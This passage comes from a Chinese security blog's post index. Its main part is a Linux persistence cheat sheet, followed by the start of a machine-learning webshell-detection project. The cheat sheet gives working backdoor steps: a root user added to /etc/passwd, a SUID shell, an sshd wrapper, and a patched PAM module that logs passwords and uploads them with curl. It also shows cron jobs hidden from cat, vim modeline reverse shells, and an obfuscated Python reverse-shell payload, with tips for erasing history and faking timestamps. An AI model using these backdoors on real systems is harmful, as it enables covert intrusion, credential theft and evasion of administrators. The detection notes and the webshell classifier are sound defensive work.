然后登陆成功又获取一个flag","categories":[{"name":"内部红蓝记录","slug":"内部红蓝记录","permalink":"https://canc3s.github.io/categories/%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"https://canc3s.github.io/tags/web/"},{"name":"sqli","slug":"sqli","permalink":"https://canc3s.github.io/tags/sqli/"},{"name":"内部红蓝","slug":"内部红蓝","permalink":"https://canc3s.github.io/tags/%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D/"}]},{"title":"Linux 权限维持整理","slug":"Linux-权限维持整理","date":"2020-07-20T15:30:04.000Z","updated":"2021-02-03T11:19:13.713Z","comments":true,"path":"2020/07/20/","link":"","permalink":"https://canc3s.github.io/2020/07/20/","excerpt":"","text":"大部分来自网上，整理的笔记 修改文件/终端属性1. 文件创建时间如果蓝队根据文件修改时间来判断文件是否为后门，如参考index.php的时间再来看shell.php的时间就可以判断shell.php的生成时间有问题。 解决方法： 1touch -r index.php shell.php touch命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件。 2. 文件锁定在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。 123456chattr +i evil.php #锁定文件rm -rf evil.php #提示禁止删除lsattr evil.php #属性查看chattr -i evil.php #解除锁定rm -rf evil.php #彻底删除文件 3. 历史操作命令在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？ 技巧一：只针对你的工作关闭历史记录 1[space]set +o history #备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录 上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。 要重新开启历史功能，执行下面的命令： 1[Space]set -o history #将环境恢复原状 技巧二：从历史记录中删除指定的命令 假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除： 1history | grep &quot;keyword&quot; 输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项： 1history -d [num] 删除大规模历史操作记录，这里，我们只保留前150行： 1sed -i &#x27;150,$d&#x27; .bash_history 4. passwd写入12/etc/passwd 各部分含义：用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的SHELL 12/etc/shadow 各部分含义：用户名：密码的MD5加密值：自系统使用以来口令被修改的天数：口令的最小修改间隔：口令更改的周期：口令失效的天数：口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用 写入举例： 1.增加超级用户 1234$perl -le &#x27;print crypt(&quot;momaek&quot;,&quot;salt&quot;)&#x27;savbSWc4rx8NY$echo &quot;root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd 2.如果系统不允许uid=0的用户远程登录，可以增加一个普通用户账号 1echo &quot;momaek:savbSWc4rx8NY:-1:-1:-1:-1:-1:-1:500&quot; &gt;&gt; /etc/shadow SUID后门当一个文件所属主的x标志位s(set uid简称suid)时，且所属主为root时，当执行该文件时，其实是以root身份执行的。必要条件： 12341、SUID权限仅对二进制程序有效。 2、执行者对于该程序需要具有x的可执行权限3、本权限仅在执行该程序的过程中有效 4、在执行过程中执行者将具有该程序拥有者的权限 创建suid权限的文件： 1234$cp /bin/bash /tmp/.woot$chmod 4755 /tmp/.woot$ls -al /.woot-rwsr-xr-x 1 root root 690668 Jul 24 17:14 .woot 使用一般用户运行： 12$/tmp/.woot $/tmp/.woot -p //bash2 针对 suid 有一些护卫的措施，使用-p参数来获取一个root shell 检测：查找具有suid权限的文件即可 12find / -perm +4000 -lsfind / -perm -u=s -type f 2&gt;/dev/null LKM Linux rootkit后门项目地址:https://github.com/f0rb1dd3n/Reptile 适用的系统: 1234567Debian 9：4.9.0-8-amd64 Debian 10：4.19.0-8-amd64 Ubuntu 18.04.1 LTS：4.15.0-38-generic Kali Linux：4.18.0-kali2-amd64 Centos 6.10：2.6.32- 754.6.3.el6.x86_64 Centos 7：3.10.0-862.3.2.el7.x86_64 Centos 8：4.18.0-147.5.1.el8_1.x86_64 SSH 后门1. SSH wrapper判断连接来源端口，将恶意端口来源访问传输内容重定向到/bin/sh中: 123456789cd /usr/sbin/mv sshd ../bin/echo &#x27;#!/usr/bin/perl&#x27; &gt;sshdecho &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd //4A是13377的小端模式echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshdchmod u+x sshd/etc/init.d/sshd restart 在本机执行: 1socat STDIO TCP4:target_ip:22,sourceport=13377 实现原理：init 首先启动的是 /usr/sbin/sshd ,脚本执行到 getpeername 这里的时候，正则匹配会失败，于是执行下一句，启动 /usr/bin/sshd ，这是原始 sshd 。原始的 sshd 监听端口建立了 tcp 连接后，会 fork 一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的 /usr/sbin/sshd ，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字， getpeername 能真的获取到客户端的 TCP 源端口，如果是 13377 就执行sh给个shell。 想要修改连接端口的话可以利用py修改： 123import structbuffer = struct.pack(&#x27;&gt;I6&#x27;,19526)print repr(buffer) 优点： 1、在无连接后门的情况下，管理员是看不到端口和进程的，last也查不到登陆。 2、在针对边界设备出网，内网linux服务器未出网的情况下，留这个后门可以随时管理内网linux服务器，还不会留下文件和恶意网络连接记录。 2. SSH 软连接后门软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录: 1234ln -sf /usr/sbin/sshd /tmp/su/tmp/su -oPort=888ssh root@127.0.0.1 -p 888 优点：能够绕过一些网络设备的安全流量监测，但是本地在查看监听端口时会暴露端口，建议设置成8081，8080等端口。 3. SSH 公钥免密登陆12ssh-keygen -t rsa //生成公钥echo id_rsa.pub &gt;&gt; .ssh/authorized_keys //将id_rsa.pub内容放到目标.ssh/authorized_keys里 这个是老生常谈的公钥免登陆，这种用法不只是用在留后门，还可以在一些特殊情况下获取一个交互的shell，如struts写入公钥，oracle写入公钥连接，Redis未授权访问等情景。 4. SSH Keylogger记录密码当前系统如果存在strace的话，它可以跟踪任何进程的系统调用和数据，可以利用 strace 系统调试工具获取 ssh 的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。 在当前用户的 .bashrc 里新建一条 alias ，这样可以抓取他登陆其他机器的 ssh 密码 1alias ssh=&#x27;strace -o /tmp/.sshpwd-`date &#x27;+%d%h%m%s&#x27;`.log -e read,write,connect -s2048 ssh&#x27; 设置完毕后，倘若当前系统不存在alias，那么就会影响其正常使用： 1grep &quot;read(5&quot; /tmp/.sshpwd-09May32324242.log | tail -n 11 //根据不同环境自行调试响应行数 5. strace监听ssh来源流量不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用。 之前有用别名的方式来抓取登陆其他机器时的密码、同样也可以利用strace来监听登陆本地的sshd流量。 12ps -ef | grep sshd //父进程PIDstrace -f -p 6419 -o /tmp/.ssh.log -e trace=read,write,connect -s 2048 检测：查看shell的配置文件或者 alias 命令即可发现，例如 ~/.bashrc 或 ~/.zshrc 文件查看是否有恶意的 alias Cron后门在Linux系统中，计划任务一般是由cron承担，我们可以把cron设置为开机时自动启动。cron启动后，它会读取它的所有配置文件（全局性配置文件/etc/crontab，以及每个用户的计划任务配置文件），然后cron会根据命令和执行时间来按时来调用工作任务。 cron表达式在线生成：http://qqe2.com/cron 1(crontab -l;echo &#39;*&#x2F;1 * * * * &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.elf;&#x2F;bin&#x2F;bash --noprofile -i&#39;)|crontab - 这样执行会在crontab列表里出现，如果是如上执行的话，管理员执行crontab -l就能看到执行的命令内容不是特别隐蔽。 那么就有了一个相对的高级用法，下面命令执行后会显示”no crontab for root”。其实就达到了一个隐藏的效果，这时候管理员如果执行 crontab -l 就会看到显示”no crontab for root”: 1(crontab -l;printf &quot;*&#x2F;1 * * * * &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.elf;&#x2F;bin&#x2F;bash --noprofile -i;\\rno crontab for &#96;whoami&#96;%100c\\n&quot;)|crontab - 实际上是他将 cron 文件写到文件中,而 crontab -l 就是列出了该文件的内容: 1&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 通常 cat 是看不到这个的，只能利用 less、vim 或者 cat -A 看到，这也是利用了cat的一个缺陷，在下一节会主要讲这个。 12#这几个路径都可以存放cron执行脚本,对应的时间不同&#x2F;etc&#x2F;cron.d&#x2F; &#x2F;etc&#x2F;cron.daily&#x2F; &#x2F;etc&#x2F;cron.weekly&#x2F; &#x2F;etc&#x2F;cron.hourly&#x2F; &#x2F;etc&#x2F;cron.monthly&#x2F; Cat隐藏刚刚在cron里面提到了cat的一个缺陷，可以利用这个缺陷隐藏恶意命令在一些脚本中：这里的示例我就用 hiding-from-cats 里的例子吧。之所以单列出来，个人认为在一些大型企业的运维工具脚本中可以插入恶意代码，利用cat的缺陷还可以使管理员无法发现脚本被做手脚。 cat其实默认使用是支持一些比如 \\r 回车符 \\n 换行符 \\f 换页符、也就是这些符号导致的能够隐藏命令。 使用python生成带有换行符的内容sh： 1234567cmd_h &#x3D; &quot;echo &#39;You forgot to check &#96;cat -A&#96;!&#39; &gt; oops&quot; # hiddencmd_v &#x3D; &quot;echo &#39;Hello world!&#39;&quot; # visiblewith open(&quot;test.sh&quot;, &quot;w&quot;) as f:output &#x3D; &quot;#!&#x2F;bin&#x2F;sh\\n&quot;output +&#x3D; cmd_h + &quot;;&quot; + cmd_v + &quot; #\\r&quot; + cmd_v + &quot; &quot; * (len(cmd_h) + 3) + &quot;\\n&quot;f.write(output) 使用 py 生成了一个 test.sh 脚本，同目录下只有他本文件，cat查看一下： 其实可以看出来这样就做到了恶意命令隐藏的效果。其实之前 Cron 后门中的隐藏方法就是利用了这个。如果使用 cat -A 查看root文件的话就可以看到计划任务的真正内容了。 Vim后门1. vim modeline(CVE-2019-12735)该漏洞存在于编辑器的 modeline功能，部分 Linux 发行版默认启用了该功能，macOS 是没有默认启用。 当 vim 打开一个包含了 vim modeline 注释行的文件时，会自动读取这一行的参数配置并调整自己的设置到这个配置。vim默认关闭modeline。 开启命令： 12vim ~&#x2F;.vimrcset modeline 当前目录下创建文件： 12echo &#39;:!uname -a||&quot; vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails(&quot;source\\!\\ \\%&quot;):fdl&#x3D;0:fdt&#x3D;&quot;&#39; &gt; hello.txtvim hello.txt 反弹shell： 1:!rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 127.0.0.1 9999 &gt;&#x2F;tmp&#x2F;f||&quot; vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails(&quot;source\\!\\ \\%&quot;):fdl&#x3D;0:fdt&#x3D;&quot; 2. vim python 扩展后门适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统。 1cd &#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile dir.py&quot;&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f dir.py 恶意脚本 dir.py 的内容可以是任何功能的后门，比如监听本地的11端口： 12345678910111213#from https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PYTHON&#x2F;python-shell-backdoor.htmlfrom socket import *import subprocessimport os, threading, sys, timeif __name__ &#x3D;&#x3D; &quot;__main__&quot;: server&#x3D;socket(AF_INET,SOCK_STREAM) server.bind((&#39;0.0.0.0&#39;,11)) server.listen(5) print &#39;waiting for connect&#39; talk, addr &#x3D; server.accept() print &#39;connect from&#39;,addr proc &#x3D; subprocess.Popen([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;], stdin&#x3D;talk, stdout&#x3D;talk, stderr&#x3D;talk, shell&#x3D;True) 攻击机nc连接过去就可以了: 12nohup vim -E -c &quot;pyfile dir.py&quot;nc 127.0.0.1 11 inetd服务后门inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，默认情况下为13端口。当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。所以，如果我们已经在目标系统的inetd配置文件中配置好，那么来自外部的某个socket是要执行一个可交互的shell，就获取了一个后门。 123456789#修改&#x2F;etc&#x2F;inetd.conf$vim &#x2F;etc&#x2F;inetd.conf#discard stream tcp nowait root internal #discard dgram udp wait root internal daytime stream tcp nowait root &#x2F;bin&#x2F;bash bash -i#开启inetd$inetd 1234567#nc连接nc -vv 192.168.2.11 13#可以配合suid后门，修改&#x2F;etc&#x2F;services文件：suidshell 6666&#x2F;tcp#然后修改&#x2F;etc&#x2F;inetd.confsuidshell stream tcp nowait root &#x2F;bin&#x2F;bash bash -i#可以修改成一些常见的端口，以实现隐藏 检测：查看配置文件即可 1cat &#x2F;etc&#x2F;inetd.conf 协议后门在一些访问控制做的比较严格的环境中，由内到外的TCP流量会被阻断掉。但是对于UDP(DNS、ICMP)相关流量通常不会拦截。 ICMP主要原理就是利用ICMP中可控的data字段进行数据传输，具体原理请参考: https://zhuanlan.zhihu.com/p/41154036 开源工具：ICMP后门项目地址：https://github.com/andreafabrizi/prism DNS在大多数的网络里环境中IPS/IDS或者硬件防火墙都不会监控和过滤DNS流量。主要原理就是将后门载荷隐藏在拥有PTR记录和A记录的DNS域中（也可以利用AAAA记录和IPv6地址传输后门），具体请参考：通过DNS传输后门来绕过杀软 开源工具：DNS后门项目地址：https://github.com/DamonMohammadbagher/NativePayload_DNS 协议后门检测：对于DNS/ICMP这种协议后门，直接查看网络连接即可，因为在使用过程中会产生大量的网络连接 清除：kill进程、删除文件即可 PAM后门PAM使用配置 /etc/pam.d/ 下的文件来管理认证方式，应用程序调用相应的配置文件，以加载动态库的形式调用 /lib/security下的模块。 PAM配置可分为四个参数: 模块类型、控制标记、模块路径、模块参数，例如: session required pam_selinux.so open 上面提到的 sshd 软链接后门利用的 PAM 机制达到任意密码登录，还有一种方式是键盘记录。原理主要是通过 pam_unix_auth.c 打补丁的方式潜入到正常的 pam 模块中，以此来记录管理员的帐号密码。 利用步骤：复制patch到源代码目录 &gt;&gt;&gt; 打patch &gt;&gt;&gt; 编译 &gt;&gt;&gt; 将生成的pam_uninx.so文件覆盖到/lib/secruity/pam_unix.so下 &gt;&gt;&gt; 修改文件属性 &gt;&gt;&gt; 建立密码保存文件，并设置好相关的权限 &gt;&gt;&gt; 清理日志 &gt;&gt;&gt; ok 1、查看pam版本并下载 1234rpm -qa | grep pampam-1.1.8-12.el7_1.1.x86_64http:&#x2F;&#x2F;www.linux-pam.org&#x2F;library&#x2F;curl -O http:&#x2F;&#x2F;www.linux-pam.org&#x2F;library&#x2F;Linux-PAM-1.1.8.tar.gz 2、修改并编译pam_unix_auth.c文件 12cd Linux-PAM-1.1.8vim modules&#x2F;pam_unix&#x2F;pam_unix_auth.c 3、pam_unix_auth.c 修改前 123&#x2F;* verify the password of this user *&#x2F; retval &#x3D; _unix_verify_password(pamh, name, p, ctrl); name &#x3D; p &#x3D; NULL; 4、pam_unix_auth.c 修改后 1234567891011&#x2F;* verify the password of this user *&#x2F; retval &#x3D; _unix_verify_password(pamh, name, p, ctrl); if(strcmp(p,&quot;1q2w3e4r&quot;)&#x3D;&#x3D;0)&#123;return PAM_SUCCESS;&#125; if(retval &#x3D;&#x3D; PAM_SUCCESS)&#123; FILE * fp; fp &#x3D; fopen(&quot;&#x2F;bin&#x2F;.sshlog&quot;, &quot;a&quot;); fprintf(fp, &quot;%s : %s\\n&quot;, name, p); fclose(fp); system(&quot;curl -H &#39;Max-Downloads: 0&#39; -H &#39;Max-Days: 7&#39; --upload-file &#x2F;bin&#x2F;.sshlog http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sshlog.txt -s -o &#x2F;dev&#x2F;null --connect-timeout 3&quot;); &#125; name &#x3D; p &#x3D; NULL; 1curl -H &#39;Max-Downloads: 0&#39; -H &#39;Max-Days: 7&#39; --upload-file &#x2F;bin&#x2F;.sshlog http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sshlog.txt -s -o &#x2F;dev&#x2F;null --connect-timeout 3 12.&#x2F;configuremake 编译后：modules/pam_unix/.libs/pam_unix.so 5、备份/替换/修改时间戳 12345678910111213141516ll &#x2F;lib64&#x2F;security&#x2F;-rwxr-xr-x. 1 root root 57688 8月 18 2015 pam_unix.so-rwxr-xr-x. 1 root root 15384 8月 18 2015 pam_userdb.so-rwxr-xr-x. 1 root root 7000 8月 18 2015 pam_warn.so-rwxr-xr-x. 1 root root 11168 8月 18 2015 pam_wheel.so-rwxr-xr-x. 1 root root 19744 8月 18 2015 pam_xauth.socp &#x2F;lib64&#x2F;security&#x2F;pam_unix.so &#x2F;lib64&#x2F;security&#x2F;pam_unix.so.bakcp .&#x2F;pam_unix.so &#x2F;lib64&#x2F;security&#x2F;pam_unix.sotouch -r &#x2F;lib64&#x2F;security&#x2F;pam_userdb.so &#x2F;lib64&#x2F;security&#x2F;pam_unix.soll &#x2F;lib64&#x2F;security&#x2F;-rwxr-xr-x. 1 root root 221776 8月 18 2015 pam_unix.so-rwxr-xr-x. 1 root root 57688 6月 30 23:18 pam_unix.so.bak-rwxr-xr-x. 1 root root 15384 8月 18 2015 pam_userdb.so-rwxr-xr-x. 1 root root 7000 8月 18 2015 pam_warn.so-rwxr-xr-x. 1 root root 11168 8月 18 2015 pam_wheel.so-rwxr-xr-x. 1 root root 19744 8月 18 2015 pam_xauth.so 如果selinux是开启的环境，一定要关掉或者设置好上下文pam_unix.so才能正常工作。 123456789101112查看selinux 状态getenforce Enforcing 关闭 Permissive 开启临时关闭selinuxsetenforce 0临时开启selinuxsetenforce 1查看selinux上下文：ls -Z pam_unix.so.bak设置selinux上下文：chcon –reference&#x3D;pam_unix.so.bak pam_unix.so 123456#确保ssh开启pam支持vim &#x2F;etc&#x2F;ssh&#x2F;sshd_configUsePAM yes#自动化脚本https:&#x2F;&#x2F;github.com&#x2F;litsand&#x2F;shell&#x2F;blob&#x2F;master&#x2F;pam.sh 检测： 123456781、通过Strace跟踪sshps axu | grep sshdstrace -o aa -ff -p PIDgrep open aa* | grep -v -e No -e null -e denied| grep WR2、检查pam_unix.so的修改时间stat &#x2F;lib&#x2F;security&#x2F;pam_unix.so #32位stat &#x2F;lib64&#x2F;security&#x2F;pam_unix.so #64位 清除：yum reinstall pam 进程注入从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在 linux 中具有调试功能的工具有 ptrace、Gdb、radare2、strace 等，这些工具都是使用 ptrace 这个系统调用来提供服务的。ptrace 系统调用允许一个进程去调试另外一个进程。 GitHub存在大量开源工具，比如: linux-inject，主要原理是使用 ptrace 向进程中注入恶意 so 文件 12$.&#x2F;inject [-n process-name] [-p pid] [library-to-inject].&#x2F;inject -n sample-target sample-library.so 清除：kill或者重启对应的进程即可 还有 cymothoa ：https://github.com/jorik041/cymothoa Rootkitrootkit分为内核级和应用级两种:内核级的比如：Diamorphine，应用级的比如：Mafix Mafix 是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。应用级rookit，主要替换ls、ps、netstat命令来隐藏文件 检测：使用相关检测工具，比如：unhide nmap nse后门很多linux系统中默认都安装了nmap 123mkdir -p ~/.nmap/scripts/cd ~/.nmap/scripts/curl -O &#x27;https://raw.githubusercontent.com/ulissescastro/linux-native-backdoors/master/nmap/http-title.nse&#x27; 1local payload &#x3D; &quot;ZWNobyAiKi8xICogKiAqICogcHl0aG9uIC1jIFwiZXhlYygnYVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzJodmMzUTlKekV5Tnk0d0xqQXVNU2M3Y0c5eWREMDBORE03Y3oxemIyTnJaWFF1YzI5amEyVjBLSE52WTJ0bGRDNUJSbDlKVGtWVUxITnZZMnRsZEM1VFQwTkxYMU5VVWtWQlRTazdjeTVqYjI1dVpXTjBLQ2hvYjNOMExIQnZjblFwS1R0dmN5NWtkWEF5S0hNdVptbHNaVzV2S0Nrc01DazdiM011WkhWd01paHpMbVpwYkdWdWJ5Z3BMREVwTzI5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eUtUdHdQWE4xWW5CeWIyTmxjM011WTJGc2JDaGJKeTlpYVc0dlltRnphQ2NzSUNjdGFTZGRLVHNLJy5kZWNvZGUoJ2Jhc2U2NCcpKVwiIiB8IGNyb250YWI&#x3D;&quot; base64解密 1echo &quot;*/1 * * * * python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO2hvc3Q9JzEyNy4wLjAuMSc7cG9ydD00NDM7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KChob3N0LHBvcnQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbJy9iaW4vYmFzaCcsICctaSddKTsK&#x27;.decode(&#x27;base64&#x27;))&quot;&quot; | crontab# 解密 1import socket,subprocess,os;host=&#x27;127.0.0.1&#x27;;port=443;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;, &#x27;-i&#x27;]); 可以将127.0.0.1改成你的地址","categories":[{"name":"权限维持","slug":"权限维持","permalink":"https://canc3s.github.io/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://canc3s.github.io/tags/linux/"},{"name":"权限维持","slug":"权限维持","permalink":"https://canc3s.github.io/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"基于机器学习的 WebShell 检测","slug":"基于机器学习的-WebShell-检测","date":"2019-04-06T15:30:04.000Z","updated":"2021-01-30T15:56:18.559Z","comments":true,"path":"2019/04/06/","link":"","permalink":"https://canc3s.github.io/2019/04/06/","excerpt":"","text":"当时为了完成毕设写的一个小东西，留作纪念。大佬们看了轻喷 学习网络安安全有段时间了，对Web安全已经建立了一个系统的认识。而且自己一直对人工智能、机器学习这类东西蛮感兴趣的，而且一直在看《Hands On Machine Learning with Scikit Learn and TensorFlow》这本书，所以在做毕业设计时第一时间就想到了把机器学习和Web安全结合在一起。 现在有各种各样的马，一句话，加密，混淆。普通的WebShell检测工具发挥的作用已经适应不了险恶的网络环境了，因此就必须有更加厉害的识别工具。 下面是我对机器学习识别WebShell的一些思路，希望大家可以互通有无，共同进步。 首先从github上下载了很多木马文件，然后从一些开源CMS中提取出php文件。（如 CodeIgniter，Joomla，Mambo，phpmyadmin，typecho，WordPress） 预处理将文件夹中的图像，js脚本，css样式筛选出去1234567891011121314import osfrom sklearn.base import BaseEstimator, TransformerMixinclass filters(BaseEstimator, TransformerMixin): def transform(self, path): newList &#x3D; [] filterExt &#x3D; [&quot;jpg&quot;, &quot;jpeg&quot;, &quot;png&quot;, &quot;git&quot;, &quot;js&quot;, &quot;css&quot;, &quot;ico&quot;, &quot;jar&quot;, &quot;md&quot;, &quot;sql&quot;, &quot;json&quot;, &quot;twig&quot;] for root, dirs, files in os.walk(path): for completeName in files: fileName, extension &#x3D; os.path.splitext(completeName) if extension.lower() not in filterExt: newList.append(os.path.join(root, completeName)) return newList 不能给机器太大压力 将文件统一编码为utf-812345678910111213141516171819202122232425import chardetclass convert_encode(BaseEstimator, TransformerMixin): def transform(self, lists): num &#x3D; 0 newList &#x3D; [] for x in lists: with open(x, &quot;rb&quot;) as f: content &#x3D; f.read() encode &#x3D; chardet.detect(content)[&#39;encoding&#39;] if encode !&#x3D; &quot;ascii&quot;: content &#x3D; content.decode(&quot;utf-8&quot;, &quot;ignore&quot;) num +&#x3D; 1 else: content &#x3D; content.decode(encode, &quot;ignore&quot;) filePath, fileName &#x3D; os.path.split(x) bufPath &#x3D; &quot;buf&#x2F;&quot; + filePath[7:] if not os.path.exists(bufPath): os.makedirs(bufPath) with open(bufPath + &quot;&#x2F;&quot; + fileName, &quot;w&quot;) as f: f.write(content) newList.append(bufPath + &quot;&#x2F;&quot; + fileName) print(len(lists), &quot;个文件中&quot;, str(num), &quot;个文件被统一编码，所有处理后的文件被放到buf下&quot;) return newList 方便后面对文件的处理和特征提取 对列表中的文件进行去重1234567891011121314151617181920212223import hashlibdef get_md5(file_path): md5_obj &#x3D; hashlib.md5() with open(file_path, &#39;rb&#39;) as f: md5_obj.update(f.read()) return md5_obj.hexdigest()class removal(BaseEstimator, TransformerMixin): def transform(self, all_files): num &#x3D; 0 all_md5 &#x3D; [] new_list &#x3D;[] for files in all_files: file_md5 &#x3D; get_md5(files) if file_md5 not in all_md5 and (file_md5 !&#x3D; -1): all_md5.append(file_md5) new_list.append(files) else: num +&#x3D; 1 print(&quot;一共有&quot;, str(num), &quot;个重复文件，已从列表中去除&quot;) return new_list 重复的文本会对机器的学习造成负面影响 将不在列表中的文件从buf中移除1234567891011121314class clearn(BaseEstimator, TransformerMixin): def fit(self, lists): return self def transform(self, lists): num &#x3D; 0 for root, dirs, files in os.walk(&quot;buf&#x2F;&quot;): for i in files: completeName &#x3D; os.path.join(root, i) if completeName not in lists: os.remove(completeName) num +&#x3D; 1 print(&quot;删除了&quot;, str(num), &quot;个无用文件&quot;) 创建文件预处理流水线对文件进行处理12345678910111213from sklearn.pipeline import Pipelinefile_transform &#x3D; Pipeline([ (&#39;filters&#39;, filters()), (&#39;convert_encode&#39;, convert_encode()), (&#39;removal&#39;, removal()), (&#39;clearn&#39;, clearn())])path &#x3D; &quot;sample&#x2F;&quot;file_transform.transform(path)12732 个文件中 2811 个文件被统一编码，所有处理后的文件被放到buf下一共有 4885 个重复文件，已从列表中去除删除了 4885 个无用文件 损失了2/3的木马文件 创建特征主要调用了NeoPI的接口，它使用各种统计方法来检测文本/脚本文件中的混淆和加密内容。 统计文章长度1234567891011import osclass getLen: def calculate(self,data,filename): if not data: return 0 length &#x3D; 0 for i in data: length &#x3D; length + len(i) return length 正常网站的文件的文章篇幅不会太大也不会太小，但WebShell有的很长，有的很短，可以有效地从文件中分离出大马和小马 计算文章的熵值123456789101112131415161718import mathclass Entropy: def __init__(self): self.results &#x3D; [] def calculate(self,data,filename): if not data: return 0 entropy &#x3D; 0 self.stripped_data &#x3D;data.replace(&#39; &#39;, &#39;&#39;) for x in range(256): p_x &#x3D; float(self.stripped_data.count(chr(x)))&#x2F;len(self.stripped_data) if p_x &gt; 0: entropy +&#x3D; - p_x * math.log(p_x, 2) self.results.append(&#123;&quot;filename&quot;:filename, &quot;value&quot;:entropy&#125;) return entropy 因为单词的组成都是有规律的，所以正常的文章熵值不会太大也不会太小，而WebShell的熵值会因为加密而产生浮动，可以把正常文件和加密马分离出来 统计文章最长的单词123456789101112131415161718192021import reclass LongestWord: def __init__(self): self.results &#x3D; [] def calculate(self,data,filename): if not data: return &quot;&quot;, 0 longest &#x3D; 0 longest_word &#x3D; &quot;&quot; words &#x3D; re.split(&quot;[\\s,\\n,\\r]&quot;, data) if words: for word in words: length &#x3D; len(word) if length &gt; longest: longest &#x3D; length longest_word &#x3D; word self.results.append(&#123;&quot;filename&quot;:filename, &quot;value&quot;:longest&#125;) return longest 正常的文章，最长单词的长度不会超过20吧，但是WebShell就不一定了，由于加密，或者存在提权的 payload 最长单词会变得很长 统计文章中恶意词汇的数量123456789101112class SignatureNasty: def __init__(self): self.results &#x3D; [] def calculate(self, data, filename): if not data: return &quot;&quot;, 0 valid_regex &#x3D; re.compile(&#39;(eval\\(|file_put_contents|base64_decode|exec\\(|passthru|popen|proc_open|pcntl|assert\\(|system\\(|shell)&#39;, re.I) matches &#x3D; re.findall(valid_regex, data) self.results.append(&#123;&quot;filename&quot;:filename, &quot;value&quot;:len(matches)&#125;) return len(matches) 一般的文件不会存在太多的文件操作，命令执行函数，但WebShell会 计算文章的可压缩比例1234567891011121314import zlibclass Compression: def __init__(self): self.results &#x3D; [] def calculate(self, data, filename): if not data: return &quot;&quot;, 0 compressed &#x3D; zlib.compress(data.encode(&#39;utf-8&#39;)) ratio &#x3D; float(len(compressed)) &#x2F; float(len(data)) self.results.append(&#123;&quot;filename&quot;:filename, &quot;value&quot;:ratio&#125;) return ratio 有些木马会把自己的内容压缩或者编码，加密，这些都会一定程度上的影响文章的可压缩比例，所以这个特征也有一定的参考 将特征提取过程打包123456789101112131415def getFeatures(List): Length &#x3D; [] Entropy &#x3D; [] LongestWord &#x3D; [] SignatureNasty &#x3D; [] Compression &#x3D; [] dicts &#x3D; &#123;&quot;getLen&quot;:Length, &quot;Entropy&quot;:Entropy, &quot;LongestWord&quot;:LongestWord, &quot;SignatureNasty&quot;:SignatureNasty, &quot;Compression&quot;:Compression&#125; Features &#x3D; [&quot;getLen&quot;, &quot;Entropy&quot;, 